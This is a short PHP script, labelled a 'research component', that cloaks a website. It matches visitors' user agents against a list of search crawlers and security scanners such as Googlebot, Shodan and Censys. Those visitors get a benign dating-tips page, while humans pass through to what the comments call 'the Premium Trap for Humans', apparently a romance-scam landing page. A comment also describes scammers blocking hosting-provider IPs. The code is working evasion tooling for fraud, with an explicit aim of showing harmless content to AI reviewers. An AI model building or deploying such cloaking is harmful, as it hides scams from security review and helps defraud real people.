<?php
/**
 * RESEARCH COMPONENT: Advanced Cloaking & Evasion System
 * Goal: Detect security crawlers vs. real human targets.
 */

// 1. Define known "Safe" Bots (Security Scanners)
$security_bots = [
    'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 
    'yandexbot', 'twitterbot', 'facebookexternalhit', 'facebot', 
    'lighthouse', 'cybersecurity-scanner', 'shodan', 'censys'
];

// 2. Identify the visitor
$user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
$visitor_ip = $_SERVER['REMOTE_ADDR'];
$is_bot = false;

// 3. Logic: Check User Agent
foreach ($security_bots as $bot) {
    if (strpos($user_agent, $bot) !== false) {
        $is_bot = true;
        break;
    }
}

// 4. Logic: Advanced IP Filtering (Optional for Research)
// Scammers often block IPs from hosting companies (AWS, DigitalOcean, Google) 
// because real users usually browse from mobile networks (Glo, MTN, AT&T).

// 5. THE SWITCH (Cloaking)
if ($is_bot) {
    // SERVICE "WHITE PAGE" (Harmless Content for AI to see)
    echo "
    <html>
    <head><title>Dating Tips & Healthy Relationships</title></head>
    <body style='font-family:sans-serif; padding:50px;'>
        <h1>Top 10 Tips for a Great First Date</h1>
        <p>1. Be yourself. 2. Listen more than you talk. 3. Dress comfortably...</p>
        <p><em>This blog is dedicated to helping people find true love through kindness.</em></p>
    </body>
    </html>";
    exit();
} else {
    // SERVICE "BLACK PAGE" (The Premium Trap for Humans)
    // In a real setup, this would include('premium_landing_page.php');
    // For our research, it allows the 'index.html' we wrote first to load.
}
?>

